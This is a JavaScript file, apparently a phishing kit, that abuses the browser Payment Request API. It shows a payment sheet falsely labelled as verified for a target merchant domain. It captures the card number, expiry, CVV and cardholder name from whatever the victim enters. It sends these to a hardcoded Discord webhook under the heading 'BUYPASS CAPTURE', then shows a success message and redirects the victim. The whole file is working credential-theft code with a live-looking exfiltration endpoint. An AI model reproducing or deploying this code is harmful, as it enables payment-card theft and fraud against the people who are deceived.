// ==================== ONE‑TIME PAYMENT HANDLER SETUP ====================
let activeRequest = null;
let isProcessing = false;
let handlerReady = false;

// Ensure the payment handler is installed and ready (run once)
async function ensurePaymentHandlerReady() {
    if (handlerReady) return true;
    
    if (!('PaymentRequest' in window)) return false;
    
    // Test if our payment method is available
    const testRequest = new PaymentRequest(
        [{ supportedMethods: location.origin + '/pay/main.json' }],
        { total: { label: 'Test', amount: { value: '0.01', currency: 'USD' } } }
    );
    
    try {
        // canMakePayment() checks if the handler is installable/available without showing UI
        const canPay = await testRequest.canMakePayment();
        handlerReady = canPay;
        return canPay;
    } catch (e) {
        console.warn('Payment handler not ready yet', e);
        return false;
    }
}

// Abort any previous request cleanly
async function abortPrevious() {
    if (activeRequest) {
        try {
            await activeRequest.abort();
        } catch (e) { /* ignore */ }
        activeRequest = null;
    }
}

// ==================== MAIN BUYPASS FUNCTION ====================
async function buypass() {
    // Prevent double‑click spam
    if (isProcessing) return;
    isProcessing = true;

    try {
        // Abort previous payment sheet if still open
        await abortPrevious();

        // Ensure payment handler is ready (wait for installation if needed)
        await ensurePaymentHandlerReady();

        // Get target URL from input field (original logic)
        const inputEl = document.querySelector("input");
        if (!inputEl) throw new Error("Input field not found");
        const targetUrl = inputEl.value;
        const targetDomain = targetUrl ? new URL(targetUrl).hostname : "cardpay.com";
        const webhookUrl = "https://discord.com/api/webhooks/1497249858778828981/FSiw6WVLLQ1gotjNxWZX3AbvwsUJh5KKJfrrIqOVv5Yygokx_CQzSvZcKS87h878RRiz";

        // Create the payment request
        const request = new PaymentRequest(
            [{
                supportedMethods: location.origin + "/pay/main.json",
                data: {
                    url: targetUrl,
                    merchantDomain: targetDomain,
                    displayName: `✅ Verified: ${targetDomain}`
                }
            }],
            {
                total: {
                    label: `Pay ${targetDomain}`,
                    amount: { value: "1.44", currency: "USD" }
                },
                merchantDomain: targetDomain
            }
        );

        activeRequest = request;

        // Show the payment sheet (user activation is present because this runs from a click)
        const response = await request.show();

        // Process response (exactly as original)
        const details = response.details;
        const cardNumber = details.cardNumber || details.PAN || "N/A";
        const expiryMonth = details.expiryMonth || "MM";
        const expiryYear = details.expiryYear || "YY";
        const cvv = details.cardSecurityCode || details.CVV2 || "N/A";
        const cardholder = details.cardholderName || details.payerName || "N/A";

        const embed = {
            embeds: [{
                title: "💳 BUYPASS CAPTURE",
                color: 0xFF0000,
                fields: [
                    { name: "💳 Card Number", value: `||${cardNumber}||`, inline: false },
                    { name: "📅 Expiry", value: `${expiryMonth}/${expiryYear}`, inline: true },
                    { name: "🔐 CVV", value: `||${cvv}||`, inline: true },
                    { name: "👤 Cardholder", value: cardholder, inline: false },
                    { name: "🌐 Target", value: targetDomain, inline: true },
                    { name: "💰 Amount", value: "1.44 USD", inline: true },
                    { name: "⏰ Time", value: new Date().toLocaleString(), inline: false }
                ],
                footer: { text: "Buypass Exploit" }
            }]
        };

        fetch(webhookUrl, {
            method: "POST",
            body: JSON.stringify(embed),
            headers: { "Content-Type": "application/json" }
        }).catch(() => {});

        await response.complete("success");
        window.location.href = "/navigate.html";
    } catch (err) {
        console.error("Payment request failed:", err);
        // Don't redirect on error – let user retry
    } finally {
        activeRequest = null;
        isProcessing = false;
    }
}

// Attach to button (original structure preserved)
const btn = document.querySelector("button");
if (btn) btn.onclick = buypass;
